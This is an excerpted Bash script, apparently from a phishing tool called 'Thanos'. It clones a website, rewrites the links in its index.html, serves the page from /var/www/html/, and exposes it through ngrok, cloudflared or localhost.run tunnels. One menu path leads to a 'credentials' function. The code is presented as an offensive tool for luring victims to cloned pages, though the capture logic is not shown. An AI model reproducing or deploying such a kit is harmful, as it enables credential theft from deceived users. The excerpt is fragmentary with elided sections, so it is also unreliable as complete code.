...
${BLUE}___________.__                                ${RED}
${BLUE}\__    ___/|  |__ _____    ____   ____  ______${RED}
${BLUE}  |    |   |  |  \\__  \  /    \ /  _ \/  ___/${RED}
${BLUE}  |    |   |   Y  \/ __ \|   |  (  <_> )___ \ ${RED}
...
# Localhost Start
localhost_start() {
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:80 ${GREEN})"
	setup_clone
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:80 ${GREEN}"
	sed -i "s|https://tridev.com|http://127.0.0.1:8080|" index.html
	cp index.html /var/www/html/
	sed -i "s|http://127.0.0.1:8080|https://tridev.com|" index.html
...
localhost_customize() {
	...
	{ sleep 1; clear; header; }
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:80 ${GREEN}"
	sed -i "s|https://tridev.com|http://$host:$port|" index.html
	cp index.html /var/www/html/
	sed -i "s|http://127.0.0.1:8080|https://tridev.com|" index.html
...
ngrok_start() {
	...
	sed -i "s|https://tridev.com|http://$ngrok_url1|" index.html
	cp index.html /var/www/html/
	sed -i "s|http://$ngrok_url1|https://tridev.com|" index.html
...
ngrok_start_customize() {
	...
	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://127.0.0.1:80"
	credentials
}
...
cloudflared_start() { 
	...
	sed -i "s|https://tridev.com|http://$cldflr_url1|" index.html
	cp index.html /var/www/html/
	sed -i "s|http://$cldflr_url1|https://tridev.com|" index.html
...
localhostrun_start() {
	...
	sed -i "s|https://tridev.com|http://$localrun_url1|" index.html
	cp index.html /var/www/html/
	sed -i "s|http://$localrun_url1|https://tridev.com|" index.html
...
menu() {
 ...
 { clear; header; echo; }
	...
	case $REPLY in 
		...
		0)
		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using Thanos "${WHITE}
		sleep 2
		clear
		exit 1;;
